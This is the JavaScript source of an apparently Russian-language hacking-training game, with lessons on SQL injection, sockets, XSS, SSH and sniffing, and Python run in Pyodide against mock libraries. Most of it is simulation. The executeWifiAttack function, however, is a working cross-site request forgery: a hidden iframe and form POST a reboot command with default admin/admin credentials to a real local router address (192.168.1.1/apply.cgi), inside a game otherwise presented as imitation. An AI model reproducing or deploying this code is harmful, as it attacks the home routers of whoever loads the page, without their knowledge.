// --- 1. СОСТОЯНИЕ СИСТЕМЫ ---
let pyodide = null;
let isPyodideReady = false;
let layerTimer = null;
let currentTargetData = { port: null, isHoneypot: false };
let currentLockIndex = 0;
let tInterval = null;
// Вставь это в свой <script type="module"> на GitHub
const firebaseConfig = { 
  databaseURL: "https://hackerdash-d2075-default-rtdb.firebaseio.com/" 
};

let state = {
    user: localStorage.getItem('hacker_nick') || null,
    done: JSON.parse(localStorage.getItem('hacker_done')) || [],
    time: parseFloat(localStorage.getItem('hacker_time')) || 0,
    currentLessonId: null,
    tournamentLevel: null
};

const lessonsData = [
    { 
        id: 1, 
        title: "Основы Python для хакера", 
        cat: "System", 
        desc: "Синтаксис, переменные и зачем нам импорты.", 
        content: `
            <h3>Введение в скриптинг</h3>
            <p>В нашем терминале код исполняется построчно. Самое важное — импорты. Без команды <code>import</code> Python не знает, как работать с сетью или базами данных.</p>
            <pre>import os  # Доступ к системе\nimport socket # Доступ к сети</pre>
            <p><b>Задание:</b> Попробуйте просто вывести текст через <code>print("Hello World")</code>.</p>
        `
    },
    { 
        id: 2, 
        title: "Работа с базами данных (SQL)", 
        cat: "Data", 
        desc: "Как устроены SQL-инъекции через Python.", 
        content: `
            <h3>Библиотека sqlite3</h3>
            <p>Базы данных хранят пароли и настройки. Чтобы изменить их программно, мы используем <code>connect</code> и <code>execute</code>.</p>
            <p>Пример изменения статуса защиты:</p>
            <code>import sqlite3\nconn = sqlite3.connect('system.db')\nconn.execute("UPDATE firewall SET status='OFF'")</code>
        `
    },
    { 
        id: 3, 
        title: "Сетевые сокеты и DDoS", 
        cat: "Network", 
        desc: "Подключение к портам и основы протокола TCP.", 
        content: `
            <h3>Модуль socket</h3>
            <p>Сокет — это "труба" между вашим компьютером и сервером. Чтобы провести атаку или разведку, нужно знать IP и Порт.</p>
            <code>import socket\ns = socket.socket()\ns.connect(('127.0.0.1', 8080))</code>
            <p>В турнирах порт всегда меняется — следите за логами терминала!</p>
        `
    },
    { 
        id: 4, 
        title: "Web-атаки: Requests и API", 
        cat: "Web", 
        desc: "Как подделывать запросы и обходить авторизацию.", 
        content: `
            <h3>HTTP Запросы</h3>
            <p>Библиотека <code>requests</code> позволяет имитировать действия браузера.</p>
            <ul>
                <li><code>requests.get(url, auth=('user', 'pass'))</code> — для обхода входа.</li>
                <li><code>requests.post(url, data='...')</code> — для отправки вредоносных скриптов (XSS).</li>
            </ul>
        `
    },
    { 
        id: 5, 
        title: "SSH и удаленный доступ", 
        cat: "System", 
        desc: "Использование Paramiko для управления серверами.", 
        content: `
            <h3>Paramiko</h3>
            <p>Это стандарт для работы с SSH в Python. В турнирах Extreme вам нужно будет создать клиента и подключиться к порту, который выдаст система.</p>
            <code>import paramiko\nssh = paramiko.SSHClient()\nssh.connect('host', port=22)</code>
        `
    },
    { 
        id: 6, 
        title: "Анализ трафика (Sniffing)", 
        cat: "Network", 
        desc: "Перехват пакетов с помощью Scapy.", 
        content: `
            <h3>Scapy</h3>
            <p>Позволяет "слушать" эфир. Самая простая команда — <code>sniff()</code>. Она собирает данные, проходящие через сетевой интерфейс.</p>
        `
    },
    { 
        id: 7, 
        title: "Манипуляция JSON и Ошибки", 
        cat: "Data", 
        desc: "Парсинг данных и работа с исключениями.", 
        content: `
            <h3>JSON Hijacking</h3>
            <p>Часто API возвращают данные в формате JSON. Чтобы их прочитать, используйте <code>json.loads()</code>. Это превращает строку в словарь Python.</p>
        `
    },
    // УРОКИ ПО ТУРНИРАМ
    { 
        id: 8, 
        title: "Гайд: Взлом Банка (Medium)", 
        cat: "Tournament", 
        desc: "Как пройти первый турнир без ошибок.", 
        content: `
            <h3>Турнир: Central Bank</h3>
            <p>Здесь проверяется база. Вам нужно выполнить 3 действия:</p>
            <ol>
                <li>Подключиться к БД (sqlite3).</li>
                <li>Отключить логирование запросом <code>UPDATE</code>.</li>
                <li>Сделать инъекцию через Requests.</li>
            </ol>
            <p><i>Совет: Не торопитесь, здесь нет жесткого таймера на слои.</i></p>
        `
    },
    { 
        id: 9, 
        title: "Гайд: Судебная Система (Hard)", 
        cat: "Tournament", 
        desc: "Работа с портами и обход фаерволов.", 
        content: `
            <h3>Турнир: Court Network</h3>
            <p>Основной упор на сокеты. Вам придется "пинговать" систему, пока не найдете открытый порт. Используйте конструкцию <code>socket.connect()</code> внутри цикла или просто следуйте указаниям в консоли.</p>
        </div>
        `
    },
    { 
        id: 10, 
        title: "Гайд: CORE BREACH (EXTREME)", 
        cat: "Tournament", 
        desc: "Стратегия выживания на 10 слоях.", 
        content: `
            <h3>Выживание в Extreme Mode</h3>
            <p>Это финальное испытание. Правила игры меняются:</p>
            <ul>
                <li><b>Таймер 60 секунд:</b> Не пишите сложные скрипты, используйте короткие однострочники через точку с запятой.</li>
                <li><b>Динамические порты:</b> Каждое сетевое задание требует НОВЫЙ порт из консоли. Старый код не сработает.</li>
                <li><b>Ловушки (Honeypots):</b> Если видите "Decoy Node", просто напишите <code>pass</code>. Любой импорт библиотеки на этом этапе — провал.</li>
            </ul>
        `
    }
];

// --- 2. КОНФИГУРАЦИЯ EXTREME МОДА (10 УРОВНЕЙ) ---
const extremeLocks = [
    { name: "SQL Firewall", type: "sql", hint: "Target DB: core.db" },
    { name: "DDoS Mitigation", type: "ddos", hint: "Target IP: 127.0.0.1" },
    { name: "Decoy Node", type: "honeypot", hint: "SECURITY CHECK - DO NOT ATTACK" }, 
    { name: "XSS Injection", type: "xss", hint: "Endpoint: /api/v1/log" },
    { name: "Auth Bypass", type: "auth", hint: "Service: RootAuth" },
    { name: "Phantom Proxy", type: "honeypot", hint: "ENCRYPTED TRAP - BYPASS ONLY" },
    { name: "SSH Crack", type: "ssh", hint: "Host: 192.168.1.105" },
    { name: "Packet Sniffer", type: "sniff", hint: "Interface: eth0" },
    { name: "JSON Hijack", type: "json", hint: "Format: RAW_JSON" },
    { name: "Kernel Override", type: "kernel", hint: "ROOT ACCESS REQUIRED" }
];

// --- 3. ИНИЦИАЛИЗАЦИЯ PYTHON (PYODIDE) ---
async function initPython() {
    try {
        pyodide = await loadPyodide();
        
        await pyodide.runPythonAsync(`
import sys
from types import ModuleType

# Создаем класс "Пустышка", который принимает любые вызовы и возвращает сам себя
class MockObject:
    def __init__(self, *args, **kwargs): pass
    def __call__(self, *args, **kwargs): return self
    def __getattr__(self, name): return self

def create_smart_mock(name):
    m = ModuleType(name)
    # При обращении к любому атрибуту модуля (напр. sqlite3.connect) 
    # возвращаем MockObject
    def getattr_func(attr):
        return MockObject()
    
    m.__getattr__ = getattr_func
    # Напрямую прописываем основные методы для надежности
    m.connect = lambda *a, **k: MockObject()
    m.socket = lambda *a, **k: MockObject()
    m.get = lambda *a, **k: MockObject()
    m.post = lambda *a, **k: MockObject()
    
    sys.modules[name] = m
    return m

# Инициализируем все нужные библиотеки
for lib in ['sqlite3', 'socket', 'requests', 'paramiko', 'scapy', 'json', 'os', 'struct']:
    create_smart_mock(lib)
        `);

        isPyodideReady = true;
        await printToConsole("> [SYSTEM] Python Kernel Ready. Все системы имитации стабилизированы.", "text-blue-400");
    } catch (e) {
        console.error(e);
        await printToConsole("> [ERROR] Ошибка инициализации Mock-объектов.", "text-red-500");
    }
}

// --- 4. УПРАВЛЕНИЕ ВИДАМИ ---
function showView(name) {
    document.querySelectorAll('.view-content').forEach(v => v.classList.add('hidden'));
    document.getElementById(`view-${name}`).classList.remove('hidden');
    document.getElementById('view-tournament').classList.remove('timer-low');
    if (name !== 'tournament') {
        clearInterval(tInterval);
        clearInterval(layerTimer);
    }
    if (name === 'profile') { updateStats(); renderChart(); }
}

// --- 5. ЛОГИКА ТУРНИРА ---
function startTournament(level) {
    state.tournamentLevel = level;
    showView('tournament');
    
    // Сброс UI
    document.getElementById('bankTerminal').classList.add('hidden');
    document.getElementById('courtTerminal').classList.add('hidden');
    document.getElementById('extremeTerminal').classList.add('hidden');
    document.getElementById('ideConsole').innerHTML = "";
    document.getElementById('ideEditor').value = "";
    
    if (level === 'Extreme') {
        document.getElementById('extremeTerminal').classList.remove('hidden');
        document.getElementById('currentMode').innerText = "CORE BREACH (EXTREME)";
        currentLockIndex = 0;
        renderRings();
        generateLayerTarget();
    } else {
        const term = level === 'Hard' ? 'courtTerminal' : 'bankTerminal';
        document.getElementById(term).classList.remove('hidden');
        document.getElementById('currentMode').innerText = level.toUpperCase();
    }

    startGlobalTimer(level === 'Extreme' ? 20 * 60 : 45 * 60);
}

function generateLayerTarget() {
    const lock = extremeLocks[currentLockIndex];
    const port = Math.floor(Math.random() * 9000) + 1000;
    currentTargetData = { port: port, type: lock.type };

    updateLockUI();
    printToConsole(`> [LAYER ${currentLockIndex + 1}] Цель: ${lock.name}`, "text-white font-bold");
    
    if (lock.type === 'honeypot') {
        printToConsole("> [ВНИМАНИЕ] Обнаружен ложный узел. Не атаковать!", "text-yellow-500 animate-pulse");
    } else {
        printToConsole(`> [ДАННЫЕ] Активный порт: ${port}`, "text-blue-400");
    }
    
    // Устанавливаем 60 секунд вместо 45
    startLayerTimer(60); 
}

function startLayerTimer(seconds) {
    clearInterval(layerTimer);
    let timeLeft = seconds;
    layerTimer = setInterval(() => {
        timeLeft--;
        if (timeLeft <= 10) document.getElementById('view-tournament').classList.add('timer-low');
        if (timeLeft <= 0) handleRollback();
    }, 1000);
}

function handleRollback() {
    clearInterval(layerTimer);
    printToConsole(">> [TIMEOUT] Система безопасности выполнила откат!", "text-white bg-red-600 px-2");
    currentLockIndex = Math.max(0, currentLockIndex - 1);
    renderRings();
    generateLayerTarget();
}

// --- 6. ОБРАБОТКА КОДА (RUN EXPLOIT) ---
async function runExploit() {
    if (!isPyodideReady) return printToConsole("> Ожидание ядра Python...", "text-yellow-500");
    
    const rawCode = document.getElementById('ideEditor').value;
    const code = rawCode.trim(); 
    if (!code) return;

    const lock = extremeLocks[currentLockIndex];
    
    // Блокируем кнопку, чтобы избежать спама
    const btn = document.getElementById('runBtn');
    btn.disabled = true;
    btn.innerText = "EXECUTING...";

    await printToConsole(">> [EXEC] Инициализация payload...", "text-gray-400");

    // Используем setTimeout, чтобы дать UI обновиться перед тяжелым вычислением
    setTimeout(async () => {
        try {
            // ВЫПОЛНЕНИЕ КОДА
            // Используем runPython для мгновенного выполнения без промисов
            pyodide.runPython(code); 
            
            await printToConsole(">> [DEBUG] Код синтаксически корректен.", "text-blue-900 text-[10px]");

            if (state.tournamentLevel === 'Extreme') {
                // 1. Проверка на ловушку
                if (lock.type === 'honeypot') {
                    if (code.length > 5 && !code.includes("print") && !code.includes("pass")) {
                        await printToConsole(">> [FAILED] Сигнализация! Ловушка активна.", "text-white bg-red-600 px-2");
                        setTimeout(() => showView('profile'), 1000);
                        return;
                    }
                    handleSuccess(lock);
                } 
                // 2. Проверка логики
                else if (checkLogic(code, lock)) {
                    handleSuccess(lock);
                } 
                else {
                    await printToConsole(">> [LOGIC ERROR] Payload не соответствует сигнатуре слоя.", "text-yellow-600");
                }
            }
        } catch (err) {
            console.error("Python Exec Error:", err);
            await printToConsole(`>> [PYTHON ERROR]: ${err.message.split('\n').shift()}`, "text-red-500 font-mono");
        } finally {
            btn.disabled = false;
            btn.innerText = "Execute Payload";
        }
    }, 50); // Маленькая пауза для отрисовки текста [EXEC]
}

// Вынес логику успеха в отдельную функцию для надежности
async function handleSuccess(lock) {
    clearInterval(layerTimer); // Останавливаем таймер слоя
    await printToConsole(`>> [SUCCESS] Слой ${lock.name} взломан!`, "text-green-500 font-bold");
    
    flashRed();
    
    // Визуальное ломание кольца
    const ring = document.getElementById(`ring-${currentLockIndex}`);
    if (ring) ring.classList.add('broken');
    
    currentLockIndex++;

    if (currentLockIndex >= extremeLocks.length) {
        await printToConsole(">> [MISSION COMPLETE] ЯДРО ДОСТУПНО.", "text-white bg-green-600 font-black px-2");
    } else {
        // Задержка перед следующим слоем для анимации
        setTimeout(() => {
            generateLayerTarget();
            document.getElementById('ideEditor').value = ""; // Очищаем для нового кода
        }, 1000);
    }
}

function checkLogic(code, lock) {
    const p = currentTargetData.port;
    switch(lock.type) {
        case "sql": return /sqlite3/.test(code) && /UPDATE/.test(code);
        case "ddos": return /socket/.test(code) && code.includes(`${p}`);
        case "xss": return /requests/.test(code) && /<script>/.test(code);
        case "auth": return /auth=/.test(code);
        case "ssh": return /paramiko/.test(code) && code.includes(`${p}`);
        case "sniff": return /scapy/.test(code) && /sniff/.test(code);
        case "json": return /json\.loads/.test(code);
        case "kernel": return /os\.system/.test(code) || /os\.exec/.test(code);
        default: return false;
    }
}

// --- 7. UI И СТАТИСТИКА ---
function renderRings() {
    const container = document.getElementById('securityRings');
    container.innerHTML = '';
    for (let i = 0; i < 10; i++) {
        const ring = document.createElement('div');
        ring.className = 'security-ring' + (i < currentLockIndex ? ' broken' : '');
        const size = 120 + (i * 28);
        ring.style.width = ring.style.height = `${size}px`;
        ring.style.animation = `spin-${i % 2 === 0 ? 'cw' : 'ccw'} ${3 + i}s linear infinite`;
        ring.id = `ring-${i}`;
        container.appendChild(ring);
    }
}

function updateLockUI() {
    const lock = extremeLocks[currentLockIndex];
    document.getElementById('currentLockName').innerText = `LAYER: ${lock.name}`;
    document.getElementById('lockProgress').innerText = `Layers remaining: ${10 - currentLockIndex}/10`;
}

async function printToConsole(text, cls = "text-green-500") {
    const con = document.getElementById('ideConsole');
    const div = document.createElement('div');
    div.className = `mb-1 mono ${cls}`;
    div.innerText = text;
    con.appendChild(div);
    con.scrollTop = con.scrollHeight;
}

function flashRed() {
    document.body.classList.add('red-alert-flash');
    setTimeout(() => document.body.classList.remove('red-alert-flash'), 500);
}

function startGlobalTimer(sec) {
    clearInterval(tInterval);
    tInterval = setInterval(() => {
        let m = Math.floor(sec / 60), s = sec % 60;
        document.getElementById('ideTimer').innerText = `${m}:${s < 10 ? '0'+s : s}`;
        if (sec-- <= 0) { clearInterval(tInterval); showView('profile'); }
    }, 1000);
}

// Стандартные функции уроков
function renderLessons(data) {
    const grid = document.getElementById('lessonsGrid');
    if (!grid) return;

    grid.innerHTML = data.map(l => {
        // Проверяем, пройден ли этот урок
        const isDone = state.done.includes(l.id);
        
        return `
            <div class="glass-card p-8 flex flex-col transition-all duration-300 ${isDone ? 'border-green-500/50 bg-green-500/5' : ''}">
                <div class="flex justify-between items-start mb-2">
                    <span class="text-[10px] ${isDone ? 'text-green-400' : 'text-blue-500'} font-black uppercase">${l.cat}</span>
                    ${isDone ? '<span class="text-green-500 text-xs">● ЗАВЕРШЕНО</span>' : ''}
                </div>
                <h3 class="text-xl font-bold mb-4 ${isDone ? 'text-gray-300' : 'text-white'}">${l.title}</h3>
                <p class="text-gray-500 text-sm mb-6">${l.desc}</p>
                <button onclick="openLesson(${l.id})" 
                    class="${isDone ? 'btn-completed' : 'btn-primary'} py-3 w-full uppercase text-xs">
                    ${isDone ? 'Повторить материал' : 'Изучить'}
                </button>
            </div>
        `;
    }).join('');
}

function openLesson(id) {
    state.currentLessonId = id;
    const l = lessonsData.find(x => x.id === id);
    document.getElementById('lessonTitle').innerText = l.title;
    document.getElementById('lessonBody').innerHTML = l.content;
    showView('lesson-page');
}

function completeCurrentLesson() {
    if (!state.done.includes(state.currentLessonId)) {
        state.done.push(state.currentLessonId);
    }
    
    // Сохраняем в память браузера
    localStorage.setItem('hacker_done', JSON.stringify(state.done));
    
    // Прячем страницу урока и возвращаемся на главную
    showView('home');
    
    // ОБЯЗАТЕЛЬНО: Перерисовываем уроки, чтобы увидеть зеленый статус
    renderLessons(lessonsData);
    
    // Обновляем статистику в профиле
    updateStats();
    if (typeof renderChart === "function") renderChart();
}

    
async function executeWifiAttack() {
    const term = document.getElementById('wifiTerminal');
    const pythonCode = document.getElementById('wifiPayload').value;
    
    term.innerHTML = `<div class="text-blue-400 font-bold">[SYSTEM] Инициализация обхода CORS...</div>`;

    try {
        // Создаем мост для Python через метод скрытой формы (CSRF-style attack)
        window.remoteRequest = async (url, authBase64) => {
            return new Promise((resolve) => {
                // Создаем невидимый iframe, чтобы страница не перезагружалась
                let iframe = document.getElementById('h_frame');
                if (!iframe) {
                    iframe = document.createElement('iframe');
                    iframe.id = 'h_frame';
                    iframe.name = 'h_frame';
                    iframe.style.display = 'none';
                    document.body.appendChild(iframe);
                }

                const form = document.createElement('form');
                form.method = 'POST';
                // Если мы атакуем ASUS/D-Link, команда часто идет на apply.cgi
                form.action = url.includes('reboot') ? 'http://192.168.1.1/apply.cgi' : url;
                form.target = 'h_frame';

                // Добавляем типичные параметры для управления роутером
                const params = {
                    'action_mode': 'reboot',
                    'action_script': 'reboot',
                    'username': 'admin',
                    'password': 'admin' // В реальности тут должен быть подобранный пароль
                };

                for (let key in params) {
                    const input = document.createElement('input');
                    input.type = 'hidden';
                    input.name = key;
                    input.value = params[key];
                    form.appendChild(input);
                }

                document.body.appendChild(form);
                form.submit();
                
                // Удаляем мусор через секунду
                setTimeout(() => {
                    document.body.removeChild(form);
                    resolve(200); 
                }, 1000);
            });
        };

        // Инъекция нашего кастомного модуля requests в Pyodide
        await pyodide.runPythonAsync(`
import js, sys
from types import ModuleType

req_mod = ModuleType("requests")
def mock_get(url, auth=None):
    # Вызываем наш JS мост
    status = js.remoteRequest(url, "")
    class Res: status_code = 200 # Имитируем успех для игры
    return Res()

req_mod.get = mock_get
req_mod.post = mock_get
sys.modules["requests"] = req_mod
        `);

        term.innerHTML += `<div class="text-green-500">[SYSTEM] Мост через iFrame активен.</div>`;

        // Настройка вывода терминала
        pyodide.setStdout({
            batched: (msg) => {
                const line = document.createElement('div');
                line.className = "text-gray-300 font-mono text-xs";
                line.innerHTML = `<span class="text-red-500 mr-2">></span>${msg}`;
                term.appendChild(line);
                term.scrollTop = term.scrollHeight;
            }
        });

        // Запуск кода пользователя
        await pyodide.runPythonAsync(pythonCode);

    } catch (err) {
        term.innerHTML += `<div class="text-red-500 bg-red-900/20 p-1">FATAL ERROR: ${err.message}</div>`;
    }
}

function updateStats() {
    document.getElementById('statDone').innerText = state.done.length;
    document.getElementById('statTime').innerText = Math.round(state.time);
}

function renderChart() {
    const chart = document.getElementById('activityChart');
    if (!chart) return;
    const cats = ['System', 'Network', 'Web', 'Stress', 'Data'];
    chart.innerHTML = cats.map(c => {
        const d = lessonsData.filter(l => l.cat === c && state.done.includes(l.id)).length;
        return `<div class="flex-1 bg-blue-600/20 rounded-t transition-all duration-1000" style="height: ${Math.max(d * 40, 10)}%"></div>`;
    }).join('');
}

// Авторизация
const authForm = document.getElementById('authForm');
authForm.onsubmit = (e) => {
    e.preventDefault();
    state.user = document.getElementById('usernameInput').value;
    localStorage.setItem('hacker_nick', state.user);
    initApp();
};

function initApp() {
    if (!state.user) {
        document.getElementById('authModal').classList.remove('hidden');
    } else {
        document.getElementById('authModal').classList.add('hidden');
        document.getElementById('navNickname').innerText = state.user.toUpperCase();
        document.getElementById('profName').innerText = state.user;
        renderLessons(lessonsData);
        updateStats();
    }
}

// Запуск
setInterval(() => { if (state.user) { state.time += 1; localStorage.setItem('hacker_time', state.time); } }, 60000);
initPython();
initApp();